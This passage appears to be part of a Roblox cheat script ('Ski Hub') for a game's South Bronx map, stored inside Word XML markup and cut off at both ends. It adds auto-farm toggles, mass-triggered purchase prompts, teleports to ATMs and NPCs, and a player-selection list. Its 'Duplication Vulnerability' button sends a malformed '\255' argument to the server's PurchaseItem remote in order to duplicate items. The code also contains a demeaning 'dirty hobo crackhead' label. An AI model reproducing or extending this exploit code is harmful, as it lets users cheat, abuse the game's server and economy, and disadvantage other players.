        <w:t xml:space="preserve">                                ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Dealershipinteraction"):FireServer("Spawn", "DirtBike")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Bike = Find_Bike()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Bike == nil then Config.South_Bronx.OwnedBike = "No" else Config.South_Bronx.OwnedBike = "Yes" end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Config.South_Bronx.OwnedBike = "Yes"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Config.South_Bronx.FarmingUtilities.ChipFarm = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if state then Start_ChipFarm() else Stop_ChipFarm() end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FarmSection:toggle({name = "Auto-Farm Marshmallows", default = false, flag = "Marshmallow_Auto_Farm", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(function() if not _ScriptLoaded then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Config.South_Bronx.OwnedBike == "Unknown" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Bike = Find_Bike()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Bike == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Dealershipinteraction"):FireServer("Spawn", "DirtBike")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Bike = Find_Bike()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Bike == nil then Config.South_Bronx.OwnedBike = "No" else Config.South_Bronx.OwnedBike = "Yes" end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Config.South_Bronx.OwnedBike = "Yes"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Config.South_Bronx.FarmingUtilities.MarshmallowFarm = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if state then Start_MarshmallowFarm() else Stop_MarshmallowFarm() end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local _MarshMallowDropdown;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                _MarshMallowDropdown = FarmSection:slider({name = "Marshmallow Amount - $950", flag = "Marshmallow_Amount", min = 1, max = 50, default = 5, suffix = "", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.FarmingUtilities.MarshmallowIncrement = state</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if _MarshMallowDropdown then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        _MarshMallowDropdown.changetext(string.format("Marshmallow Amount - $%s", (state * 190)))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FarmSection:label({wrapped = true, name = "You must own a house with pots to use the marshmallow farm!"})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local DupeSection = LocalPlayerColumn:section({name = "Duplication Section", side = "right", size = 0.2, icon = "rbxassetid://139628202576511"})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                DupeSection:button({name = "Duplication Vulnerability", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FireServer(ReplicatedStorage.RemoteEvents.PurchaseItem, 'Shoes', 'YZ Slides', '\255')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                _ScriptLoaded = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            do -- \\ Teleports</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Location_Names = {"Dirty Hobo 💩"; "Active ATM 🏧"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Config.South_Bronx.Locations do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.insert(Location_Names, Index)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                table.sort(Location_Names)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local PurchaseGunColumn = PurchaseGunTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local WeaponListSection = PurchaseGunColumn:section({name = "Purchase Selected Item", side = "left", size = 1, icon = GetImage("Cash.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                WeaponListSection:list({flag = "PurchaseSelectedItem_SouthBronx", options = Config.South_Bronx.Guns, callback = function(v)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not v then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Config.South_Bronx.Selected_Item = tostring(v)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local self = string.match(Config.South_Bronx.Selected_Item, "^(.*) %-");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local DidntBuy = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local suc, err = pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            self = self:match("^%s*(.-)%s*$");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local PromptCFrame = GunPosition[self];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local OldCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ItemReceieved = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local Check = LocalPlayer.Backpack.ChildAdded:Connect(function(Child)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if tostring(Child) == tostring(self) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        ItemReceieved = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.wait(10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ItemReceieved = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                repeat RunService.RenderStepped:Wait() until ItemReceieved == true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Check:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Teleport_Status = Teleport(PromptCFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Teleport_Status == "Failed" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    info = `Failed to purchase {self}!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    lifetime = 7.5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                DidntBuy = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat RunService.RenderStepped:Wait() until LocalPlayer.Character.Humanoid.SeatPart == nil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            for Index = 1, Config.South_Bronx.Item_Amount do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                fireproximityprompt(Workspace:FindFirstChild("PromptPurchases")[self].proxprompt:FindFirstChildOfClass("ProximityPrompt"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat RunService.RenderStepped:Wait() until ItemReceieved == true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat RunService.RenderStepped:Wait() until Teleport_Status == "Success"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Teleport(OldCFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not LocalPlayer.Backpack:FindFirstChild(self) and not LocalPlayer.Character:FindFirstChild(self)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`Failed to purchase {self}!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                lifetime = 7.5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            })</w:t>
      </w:r>
    </w:p>
    <w:p/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if not DidntBuy then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if suc then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    info = `Successfully purchased {self}!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    info = `Failed to purchase item {self} . error : {err}`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    lifetime = 15</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PurchaseGunColumn = PurchaseGunTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local TeleportListSection = PurchaseGunColumn:section({name = "Teleport To Location", side = "right", size = 1, icon = GetImage("World.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Location_Names = {"Dirty Hobo 💩"; "Active ATM 🏧"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Config.South_Bronx.Locations do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.insert(Location_Names, Index)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                table.sort(Location_Names, function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return select(1, ...) &lt; select(2, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local TP_Debounce = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                TeleportListSection:list({flag = "TeleportToPlace_SouthBronx", options = Location_Names, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not state then</w:t>
      </w:r>
    </w:p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if TP_Debounce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`Please wait!`,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/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Config.South_Bronx.Selected_Location = state</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local _Position = CFrame.new(0,0,0)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TP_Debounce = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local suc, error = pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Config.South_Bronx.Selected_Location ~= "Dirty Hobo 💩" and Config.South_Bronx.Selected_Location ~= "Active ATM 🏧" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            _Position = Config.South_Bronx.Locations[Config.South_Bronx.Selected_Location]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Teleport(Config.South_Bronx.Locations[Config.South_Bronx.Selected_Location])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            elseif Config.South_Bronx.Selected_Location == "Dirty Hobo 💩" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Workspace.Folders.HomelessPeople:FindFirstChild("RightLowerLeg", true) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local _Hobo = Workspace.Folders.HomelessPeople:FindFirstChild("RightLowerLeg", true).CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    _Position = _Hobo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Teleport(_Hobo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        info = `Failed to locate dirty hobo crackhead!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            elseif Config.South_Bronx.Selected_Location == "Active ATM 🏧" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local ATMPositions = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM1 = CFrame.new(-30, 4, -300);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM2 = CFrame.new(539, 4, -353);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM3 = CFrame.new(497, 4, 403);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM4 = CFrame.new(236, 4, -158);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM5 = CFrame.new(525, -8, -92);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM6 = CFrame.new(-450, 4, 370);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM7 = CFrame.new(-266, 4, -209);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM8 = CFrame.new(-11, 4, 231);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM9 = CFrame.new(717, 4, 410);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM10 = CFrame.new(-532, 3, -21);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM11 = CFrame.new(-646, 4, 155);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM12 = CFrame.new(698, 3, -241);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM13 = CFrame.new(-315, 4, 142);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM14 = CFrame.new(-378, 4, -365);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM15 = CFrame.new(360, 4, -364);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM16 = CFrame.new(870, 3, -346);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM17 = CFrame.new(904, 3, -99);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM18 = CFrame.new(1095, 3, 178);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM19 = CFrame.new(1054, 4, 585);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM20 = CFrame.new(895, 4, 142);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM21 = CFrame.new(1021, 3, -229);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local ATM;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                for Index, Value in Workspace.Map.ATMS:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if Value.ATMScreen.Transparency == 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        ATM = Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        break</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                _Position = ATMPositions[tostring(ATM)]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Teleport(ATMPositions[tostring(ATM)])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TP_Debounce = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if (LocalPlayer.Character.HumanoidRootPart.Position - _Position.Position).Magnitude &gt; 20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`Failed teleported to {state}!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                lifetime = 7.5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            })</w:t>
      </w:r>
    </w:p>
    <w:p/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if suc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`Successfully teleported to {state}!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        else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`Teleportation to {state}. error : {err}`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                lifetime = 15</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            do -- \\ Player Tab        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Column = PlayersTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local PlayerListSection = Column:section({name = "Select Player", size = 1, default = false, side = 'left' --[[3 people icon]]})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local PlayerList = PlayerListSection:list({flag = "SelectPlayer_SouthBronx", options = {}, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.PlayerUtilities.SelectedPlayer = tostring(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local RefreshPlayers = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Cache = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for i, Player in Players:GetPlayers() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Player == LocalPlayer then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        table.insert(Cache, Player.Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.sort(Cache)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PlayerList.refresh_options(Cache)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.spawn(RefreshPlayers)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players.PlayerAdded:Connect(RefreshPlayers)</w:t>
